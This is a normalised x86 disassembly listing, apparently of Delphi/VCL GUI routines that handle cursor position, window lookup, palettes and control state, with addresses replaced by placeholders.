xor eax eax
call sub_416a38
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43f6c8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416a38
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43e0c4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403368
mov ebx eax
sub_43e138
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43e404
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43e392
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43d004
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40331c
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43e0c4
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43d9f0
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_44808c
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e399
mov eax [ rw-data ]
call sub_40316c
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_457570
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_440d98
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43d8bc
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45b2d4
sub_43e399
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_40316c
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4032f8
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
sub_43e428
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ca3c
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43e45c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43e428
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43f6f4
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_443cb8
test eax eax
je r-xdata
mov esi eax
sub_43e4a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_417d38
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx ] eax
sub_43e4cc
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418030
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_40316c
xor eax eax
mov [ ebx ] eax
sub_43e4ec
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43e51c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418258
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e5cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43e5a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43e758
call sub_4039a4
call sub_4039a4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417e94
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_422868
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43e5d8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418258
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e676
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e67d
mov eax [ rw-data ]
call sub_4182bc
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43e64e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43e758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4228c4
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417e94
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_422868
test al al
je r-xdata
sub_43e684
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_43e758
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42240c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_43e6b0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_422a6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_422a70
mov eax [ ebp - 0x4 ]
call sub_43e7a4
mov eax [ rw-data ]
call sub_418258
mov ebx eax
xor eax eax
push ebp
push sub_43e735
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4182bc
retn
call sub_43e51c
sub_43e758
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_422a70
mov edx ebx
mov eax [ rw-data ]
call sub_41826c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43e7a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4401f4
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43e7d0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43e80c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41858c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43e854
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43e910
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e9dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e9e4
lea eax [ ebp - 0x1c ]
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403368
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44f3a8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409118
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f94
sub_43ea00
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43ea67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44bfbc
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43fbb0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov edx [ eax + 0x64 ]
pop eax
call sub_40434c
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ea6e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov al 0x1
sub_43ea74
push ebx
mov ebx eax
mov eax ebx
call sub_44bfe4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43eaa8
push ebx
mov ebx eax
mov eax ebx
call sub_44c034
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_40434c
je r-xdata
mov al 0x1
pop ebx
retn
sub_43eae0
push ebx
mov ebx eax
mov eax ebx
call sub_44c070
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43eb14
push ebx
mov ebx eax
mov eax ebx
call sub_41efc8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43eb3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43fbe0
sub_43eb5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43eb7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f94
sub_43eba0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43fad0
sub_43ebc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43ebec
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_40434c
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43ec50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43f52c
sub_43ec70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43f518
sub_43ec90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43ecb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e6d8
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421838
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43fc60
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43e7d0
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_440b58
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43ed88
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4034f8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45f1ec
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034e0
push edi
xor ecx ecx
mov edx 0xb039
call sub_440d98
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43f550
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403368
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_40316c
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_40316c
mov eax [ edi + 0x68 ]
call sub_40316c
mov eax [ edi + 0x64 ]
call sub_408c88
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e724
test bl bl
jle r-xdata
sub_43ee54
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43ee7c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403368
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ef04
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43f204
sub_43ef24
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_40316c
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_441bb4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403368
mov edx ebx
mov eax edi
call sub_41e7a8
mov eax ebx
mov si 0xffd9
call sub_403368
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43efec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41eb38
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_440d98
sub_43f080
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43fb68
jmp r-xdata
xor edx edx
mov eax esi
call sub_43ef24
sub_43f0c4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403368
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43ef04
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403368
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43f16c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_441328
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43fff8
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
